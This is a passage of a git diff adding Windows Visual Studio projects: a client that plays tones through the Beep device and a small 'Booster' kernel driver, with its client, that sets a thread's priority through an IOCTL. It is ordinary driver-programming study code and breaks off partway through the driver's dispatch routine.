@@ -1,0 +1,3599 @@
+diff --git a/.gitignore b/.gitignore
+new file mode 100644
+index 0000000..6797a26
+--- /dev/null
++++ b/.gitignore
+@@ -0,0 +1,54 @@
++# Windows Installer Files
++Thumbs.db
++ehthumbs.db
++
++# Windows Installer files
++*.cab
++*.msi
++*.msm
++*.msp
++
++# VS temporary files
++.vs/
++.vscode/
++.idea/
++
++
++# Windows image file
++*.iso
++
++# Compiled files
++*.obj
++*.exe
++*.dll
++*.pdb
++*.ilk
++*.exp
++*.lib
++*.suo
++*.user
++*.aps
++*.pch
++
++# Generated Visual Studio files
++[Dd]ebug/
++[Dd]ebugPublic/
++[Dd]Release/
++[Dd]ReleasePublic/
++x64/
++x86/
++ARM/
++ARM64/
++
++# Npm and Node.js related
++node_modules/
++
++# Windows Installer Logs
++*.cab
++*.msi
++*.log
++
++# Windows system files
++*.bak
++*.swp
++
+diff --git a/BeepClient/BeepClient.sln b/BeepClient/BeepClient.sln
+new file mode 100644
+index 0000000..84aa1a0
+--- /dev/null
++++ b/BeepClient/BeepClient.sln
+@@ -0,0 +1,28 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178 d17.12
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "BeepClient", "BeepClient\BeepClient.vcxproj", "{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|x64 = Debug|x64
++		Debug|x86 = Debug|x86
++		Release|x64 = Release|x64
++		Release|x86 = Release|x86
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Debug|x64.ActiveCfg = Debug|x64
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Debug|x64.Build.0 = Debug|x64
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Debug|x86.ActiveCfg = Debug|Win32
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Debug|x86.Build.0 = Debug|Win32
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Release|x64.ActiveCfg = Release|x64
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Release|x64.Build.0 = Release|x64
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Release|x86.ActiveCfg = Release|Win32
++		{0AE19041-2A8B-4BA9-9AFF-B121DC13DF8A}.Release|x86.Build.0 = Release|Win32
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/BeepClient/BeepClient/BeepClient.cpp b/BeepClient/BeepClient/BeepClient.cpp
+new file mode 100644
+index 0000000..da5712a
+--- /dev/null
++++ b/BeepClient/BeepClient/BeepClient.cpp
+@@ -0,0 +1,37 @@
++#include <Windows.h>
++#include <stdio.h>
++#include <winternl.h>
++#include <ntddbeep.h>
++
++#pragma comment(lib, "ntdll")
++
++int main(int argc, const char* argv[]) {
++
++	printf("beep [<frequency> <duration_in_msec>]\n");
++	int freq = 800, duration = 1000;
++
++	if (argc > 2) {
++		freq = atoi(argv[1]);
++		duration = atoi(argv[2]);
++	}
++
++	HANDLE hFile; 
++	OBJECT_ATTRIBUTES attr;
++	UNICODE_STRING name; 
++	RtlInitUnicodeString(&name, L"\\Device\\Beep");
++	InitializeObjectAttributes(&attr, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
++	IO_STATUS_BLOCK ioStatus;
++	NTSTATUS status = ::NtOpenFile(&hFile, GENERIC_WRITE, &attr, &ioStatus, 0, 0);
++
++	if (NT_SUCCESS(status)) { 
++		//the input buffer passed to DeviceIOControl is a structure called BEEP_SET_PARAMETERS that contains frequency and duration
++		BEEP_SET_PARAMETERS params;
++		params.Frequency = freq;
++		params.Duration = duration;
++		DWORD bytes;
++		printf("Playing freq: %u, duration: %u\n", freq, duration);
++		::DeviceIoControl(hFile, IOCTL_BEEP_SET, &params, sizeof(params), nullptr, 0, &bytes, nullptr);
++		::Sleep(duration);
++		::CloseHandle(hFile);
++	}
++}
+\ No newline at end of file
+diff --git a/BeepClient/BeepClient/BeepClient.vcxproj b/BeepClient/BeepClient/BeepClient.vcxproj
+new file mode 100644
+index 0000000..35e8ac1
+--- /dev/null
++++ b/BeepClient/BeepClient/BeepClient.vcxproj
+@@ -0,0 +1,135 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{0ae19041-2a8b-4ba9-9aff-b121dc13df8a}</ProjectGuid>
++    <RootNamespace>BeepClient</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="BeepClient.cpp" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/BeepClient/BeepClient/BeepClient.vcxproj.filters b/BeepClient/BeepClient/BeepClient.vcxproj.filters
+new file mode 100644
+index 0000000..96cea72
+--- /dev/null
++++ b/BeepClient/BeepClient/BeepClient.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="BeepClient.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/Booster/Boost/Boost.cpp b/Booster/Boost/Boost.cpp
+new file mode 100644
+index 0000000..266a3fa
+--- /dev/null
++++ b/Booster/Boost/Boost.cpp
+@@ -0,0 +1,35 @@
++#include <stdio.h>
++#include <Windows.h>
++#include "..\Booster\BoosterCommon.h"
++
++int main(int argc, char* argv[]) {
++	
++	if (argc < 3) {
++		printf("Usage: Boost <tid> <priority>\n");
++		return 0; 
++	}
++
++	int tid = atoi(argv[1]);
++	int priority = atoi(argv[2]);
++
++	HANDLE hDevice = CreateFileW(L"\\\\.\\Booster", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
++	if (hDevice == INVALID_HANDLE_VALUE) {
++		printf("Error opening device (%u)\n", GetLastError());
++		return 1; 
++	}
++
++	ThreadData input; 
++	input.ThreadId = tid; 
++	input.priority = priority;
++	DWORD bytesReturned;
++	BOOL ok = DeviceIoControl(hDevice, IOCTL_SET_PRIORITY, &input, sizeof(input), nullptr, 0, &bytesReturned, nullptr);
++
++	if (!ok) {
++		printf("Error opening DeviceIoControl (%u)\n", GetLastError());
++		return 1;
++	}
++
++	printf("Success!!");
++
++	CloseHandle(hDevice);
++}
+diff --git a/Booster/Boost/Boost.vcxproj b/Booster/Boost/Boost.vcxproj
+new file mode 100644
+index 0000000..937fee5
+--- /dev/null
++++ b/Booster/Boost/Boost.vcxproj
+@@ -0,0 +1,136 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{49d980ea-adb3-49c5-86e5-cbbe0fa77afb}</ProjectGuid>
++    <RootNamespace>Boost</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="Boost.cpp" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/Booster/Boost/Boost.vcxproj.filters b/Booster/Boost/Boost.vcxproj.filters
+new file mode 100644
+index 0000000..5214d9d
+--- /dev/null
++++ b/Booster/Boost/Boost.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Boost.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/Booster/Booster.sln b/Booster/Booster.sln
+new file mode 100644
+index 0000000..6043ab6
+--- /dev/null
++++ b/Booster/Booster.sln
+@@ -0,0 +1,42 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178 d17.12
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Booster", "Booster\Booster.vcxproj", "{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}"
++EndProject
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Boost", "Boost\Boost.vcxproj", "{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|ARM64 = Debug|ARM64
++		Debug|x64 = Debug|x64
++		Release|ARM64 = Release|ARM64
++		Release|x64 = Release|x64
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|ARM64.ActiveCfg = Debug|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|ARM64.Build.0 = Debug|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|ARM64.Deploy.0 = Debug|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|x64.ActiveCfg = Debug|x64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|x64.Build.0 = Debug|x64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Debug|x64.Deploy.0 = Debug|x64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|ARM64.ActiveCfg = Release|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|ARM64.Build.0 = Release|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|ARM64.Deploy.0 = Release|ARM64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|x64.ActiveCfg = Release|x64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|x64.Build.0 = Release|x64
++		{EB7F3114-BE8F-4AA6-979C-E31BCCC9C969}.Release|x64.Deploy.0 = Release|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Debug|ARM64.ActiveCfg = Debug|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Debug|ARM64.Build.0 = Debug|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Debug|x64.ActiveCfg = Debug|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Debug|x64.Build.0 = Debug|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Release|ARM64.ActiveCfg = Release|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Release|ARM64.Build.0 = Release|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Release|x64.ActiveCfg = Release|x64
++		{49D980EA-ADB3-49C5-86E5-CBBE0FA77AFB}.Release|x64.Build.0 = Release|x64
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/Booster/Booster/Booster.cpp b/Booster/Booster/Booster.cpp
+new file mode 100644
+index 0000000..5dcc17f
+--- /dev/null
++++ b/Booster/Booster/Booster.cpp
+@@ -0,0 +1,93 @@
++#include <ntifs.h> //must be put before include <ntddk.h>
++#include <ntddk.h>
++#include "BoosterCommon.h"
++
++
++void BoosterUnload(PDRIVER_OBJECT DriverObject);
++
++//this are dispatch routines 
++NTSTATUS BoosterCreateClose(PDEVICE_OBJECT, PIRP Irp);
++NTSTATUS BoosterDeviceControl(PDEVICE_OBJECT, PIRP Irp);
++
++extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
++	DriverObject->DriverUnload = BoosterUnload;
++
++	DriverObject->MajorFunction[IRP_MJ_CREATE] = BoosterCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_CLOSE] = BoosterCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = BoosterDeviceControl;
++
++	PDEVICE_OBJECT DeviceObject;
++	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Booster");
++	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
++
++	if (!NT_SUCCESS(status)) {
++		KdPrint(("Failed in IoCreateDevice (0x%X)\n", status));
++		return status; 
++	}
++
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Booster");
++	status = IoCreateSymbolicLink(&symLink, &devName);
++
++	if (!NT_SUCCESS(status)) {
++		IoDeleteDevice(DeviceObject); 
++		KdPrint(("Failed in IoCreateSymbolicLink (0x%X)\n", status));
++		return status; 
++	}
++
++	return STATUS_SUCCESS;
++}
++
++//do what has been done in DriverEntry, but in reverse
++void BoosterUnload(PDRIVER_OBJECT DriverObject) {
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Booster");
++	IoDeleteSymbolicLink(&symLink);
++	IoDeleteDevice(DriverObject->DeviceObject);
++}
++
++NTSTATUS BoosterCreateClose(PDEVICE_OBJECT, PIRP Irp) {
++	Irp->IoStatus.Status = STATUS_SUCCESS;
++	Irp->IoStatus.Information = 0; 
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return STATUS_SUCCESS; 
++}
++
++NTSTATUS BoosterDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
++	auto stack = IoGetCurrentIrpStackLocation(Irp);
++	auto dic = &stack->Parameters.DeviceIoControl;
++	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
++	switch (dic->IoControlCode) {
++		
++		case IOCTL_SET_PRIORITY:
++			if (dic->InputBufferLength < sizeof(ThreadData)) {
++				status = STATUS_BUFFER_TOO_SMALL;
++				break;
++			}
++			
++			ThreadData* input = (ThreadData*)Irp->AssociatedIrp.SystemBuffer;
++			if (input == nullptr) {
++				status = STATUS_INVALID_PARAMETER;
++				break;
++			}
++			if (input->priority < 1 || input->priority > 31) {
++				status = STATUS_INVALID_PARAMETER;
++				break;
++			}
++			
++			//the PsLookup function increments the reference count of the thread object, so it cannot die until further notice
++			PETHREAD Thread; 
++			status = PsLookupThreadByThreadId(UlongToHandle(input->ThreadId), &Thread);
++			if (!NT_SUCCESS(status)) break;
++			
++			//KeSetPriorityThread returns the previous priority of the thread, but we do not care
++			KeSetPriorityThread((PKTHREAD)Thread, input->priority);// is sufficient to do thid "(PKTHREAD)Thread" because the KTHREAD pointer is the first element of the ETHREAD structure
++			ObfDereferenceObject(Thread); // decrements by one the reference count of the specified kernel object
++			break;
++
++	}
++
